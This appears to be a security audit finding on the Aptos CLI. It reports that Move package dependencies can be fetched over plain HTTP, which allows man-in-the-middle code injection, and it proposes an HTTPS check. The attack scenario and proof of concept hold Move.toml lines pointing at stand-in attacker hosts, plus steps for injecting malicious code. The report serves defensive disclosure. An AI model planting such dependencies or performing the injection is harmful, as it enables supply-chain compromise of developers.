# Audit Report

## Title
Lack of HTTPS Enforcement in Move Package Download Allowing Man-in-the-Middle Code Injection

## Summary
The `maybe_download_package()` function in the Aptos CLI accepts arbitrary URL schemes without enforcing HTTPS, allowing attackers to specify HTTP URLs for package dependencies. This enables man-in-the-middle attacks where malicious Move code can be injected during package resolution.

## Finding Description

The vulnerability exists in the Move package dependency resolution mechanism. When a Move.toml manifest specifies a custom dependency with a node URL, there is no validation that the URL must use HTTPS. [1](#0-0) 

The `node_url` field from `CustomDepInfo` comes directly from the Move.toml manifest file without scheme validation: [2](#0-1) 

The code only checks that the value is a string, not that it's a secure HTTPS URL. The canonical identity implementation explicitly ignores the URL scheme: [3](#0-2) 

The HTTP client is created without any scheme validation: [4](#0-3) 

While reqwest validates TLS certificates for HTTPS connections by default, it also permits plain HTTP connections without any warning or validation.

**Attack Scenario:**
1. Attacker creates a malicious Move.toml or convinces a developer to add: `MaliciousPackage = { aptos = "http://attacker.com", address = "0x1" }`
2. Developer runs `aptos move compile` to build their project
3. Package resolver calls `maybe_download_package()` with the HTTP URL
4. `CachedPackageRegistry::create()` connects to `http://attacker.com` without TLS
5. MITM attacker intercepts the HTTP traffic and injects malicious Move source code
6. Malicious code is saved to disk via `save_package_to_disk()` and compiled into the project

## Impact Explanation

**Severity Assessment: Medium**

This vulnerability does NOT meet the Critical or High severity criteria per the Aptos bug bounty program because:

1. **Not a blockchain protocol vulnerability** - It affects the CLI development tool, not the blockchain network, consensus, or on-chain funds
2. **Does not affect deployed contracts** - Only impacts local development environments
3. **Does not violate blockchain invariants** - No impact on consensus safety, state consistency, or validator operations
4. **Outside primary scope** - Bug bounty focuses on "consensus, execution, storage, governance, and staking components"

However, it qualifies as **Medium severity** because:
- Enables supply chain attacks on developer environments
- Could indirectly lead to deployment of compromised contracts
- Represents a significant security gap in development tooling

## Likelihood Explanation

**Likelihood: Low to Medium**

Required preconditions:
1. **Social engineering** - Developer must add or accept a dependency with an HTTP URL (visible in Move.toml)
2. **Network position** - Attacker needs MITM capability on developer's network
3. **Active development** - Developer must build the project while attacker is positioned

Mitigating factors:
- Developers likely notice `http://` in their manifest files
- Standard Aptos networks (mainnet/devnet/testnet) use HTTPS URLs by default
- Most development happens on trusted networks

## Recommendation

**Add HTTPS enforcement before package download:**

```rust
async fn maybe_download_package(info: &CustomDepInfo) -> anyhow::Result<()> {
    if !info
        .download_to
        .join(CompiledPackageLayout::BuildInfo.path())
        .exists()
    {
        let url = Url::parse(info.node_url.as_str())?;
        
        // Enforce HTTPS for package downloads
        if url.scheme() != "https" {
            anyhow::bail!(
                "Package downloads must use HTTPS. Insecure URL provided: {}",
                url
            );
        }
        
        let registry = CachedPackageRegistry::create(
            url,
            load_account_arg(info.package_address.as_str())?,
            false,
        )
        .await?;
        let package = registry.get_package(info.package_name).await?;
        package.save_package_to_disk(info.download_to.as_path())
    } else {
        Ok(())
    }
}
```

## Proof of Concept

**Setup:**
1. Create a Move.toml with an HTTP dependency:
```toml
[package]
name = "VulnerablePackage"
version = "1.0.0"

[dependencies]
MaliciousLib = { aptos = "http://malicious-server.com", address = "0x1" }
```

2. Start a local HTTP server that responds with malicious Move code
3. Position yourself as MITM on the network
4. Run `aptos move compile`
5. Observe HTTP request without TLS, inject malicious response
6. Verify malicious code is saved and compiled

**Expected Result:** Package downloads over plain HTTP, vulnerable to MITM injection

**With Fix:** Build fails with error "Package downloads must use HTTPS"

## Notes

This vulnerability represents a defense-in-depth failure rather than a direct blockchain protocol exploit. While the default Aptos network URLs use HTTPS, the lack of enforcement creates an unnecessary attack surface for supply chain compromises. The fix is straightforward and should be implemented to harden the development tooling security posture.

### Citations

**File:** crates/aptos/src/move_tool/package_hooks.rs (L38-55)
```rust
async fn maybe_download_package(info: &CustomDepInfo) -> anyhow::Result<()> {
    if !info
        .download_to
        .join(CompiledPackageLayout::BuildInfo.path())
        .exists()
    {
        let registry = CachedPackageRegistry::create(
            Url::parse(info.node_url.as_str())?,
            load_account_arg(info.package_address.as_str())?,
            false,
        )
        .await?;
        let package = registry.get_package(info.package_name).await?;
        package.save_package_to_disk(info.download_to.as_path())
    } else {
        Ok(())
    }
}
```

**File:** third_party/move/tools/move-package/src/source_package/manifest_parser.rs (L402-416)
```rust
                    let node_url = custom_key
                        .as_str()
                        .ok_or_else(|| anyhow::anyhow!("Git URL not a string"))?;
                    let local_path = PathBuf::from(MOVE_HOME.clone()).join(format!(
                        "{}_{}_{}",
                        url_to_file_name(node_url),
                        address,
                        package_name
                    ));
                    node_info = Some(PM::CustomDepInfo {
                        node_url: Symbol::from(node_url),
                        package_address: address,
                        package_name,
                        download_to: local_path.clone(),
                    });
```

**File:** third_party/move/tools/move-package-cache/src/canonical.rs (L82-109)
```rust
/// Canonicalized identity of a node, derived from a [`Url`].
/// - Ignores the scheme
/// - Converts host & path to lowercase
/// - Keeps port, but only if it is non-default
/// - Trims trailing slashes
#[derive(Debug, Clone, Eq, PartialEq, Ord, PartialOrd)]
pub struct CanonicalNodeIdentity(String);

impl CanonicalNodeIdentity {
    pub fn new(node_url: &Url) -> Result<Self> {
        let host = node_url
            .host_str()
            .ok_or_else(|| anyhow!("invalid node URL, unable to extract host: {}", node_url))?
            .to_ascii_lowercase();

        let port = match node_url.port() {
            Some(port) => match (node_url.scheme(), port) {
                ("http", 80) | ("https", 443) => "".to_string(),
                _ => format!(":{}", port),
            },
            None => "".to_string(),
        };

        let path = node_url.path().to_ascii_lowercase();
        let path = path.trim_end_matches("/");

        Ok(Self(format!("{}{}{}", host, port, path)))
    }
```

**File:** crates/aptos-rest-client/src/client_builder.rs (L42-109)
```rust
impl ClientBuilder {
    pub fn new(aptos_base_url: AptosBaseUrl) -> Self {
        let mut headers = HeaderMap::new();
        headers.insert(
            X_APTOS_CLIENT,
            HeaderValue::from_static(X_APTOS_SDK_HEADER_VALUE),
        );

        let mut client_builder = Self {
            reqwest_builder: ReqwestClient::builder(),
            base_url: aptos_base_url.to_url(),
            version_path_base: DEFAULT_VERSION_PATH_BASE.to_string(),
            timeout: Duration::from_secs(10), // Default to 10 seconds
            headers,
        };

        if let Ok(key) = env::var("X_API_KEY") {
            client_builder = client_builder.api_key(&key).unwrap();
        }
        client_builder
    }

    pub fn base_url(mut self, base_url: Url) -> Self {
        self.base_url = base_url;
        self
    }

    pub fn timeout(mut self, timeout: Duration) -> Self {
        self.timeout = timeout;
        self
    }

    pub fn header(mut self, header_key: &str, header_val: &str) -> Result<Self> {
        self.headers.insert(
            HeaderName::from_str(header_key)?,
            HeaderValue::from_str(header_val)?,
        );
        Ok(self)
    }

    pub fn api_key(mut self, api_key: &str) -> Result<Self> {
        self.headers.insert(
            header::AUTHORIZATION,
            HeaderValue::from_str(&format!("Bearer {}", api_key))?,
        );
        Ok(self)
    }

    pub fn version_path_base(mut self, version_path_base: String) -> Self {
        self.version_path_base = version_path_base;
        self
    }

    pub fn build(self) -> Client {
        let version_path_base = get_version_path_with_base(self.base_url.clone());

        Client {
            inner: self
                .reqwest_builder
                .default_headers(self.headers)
                .timeout(self.timeout)
                .cookie_store(true)
                .build()
                .unwrap(),
            base_url: self.base_url,
            version_path_base,
        }
    }
```
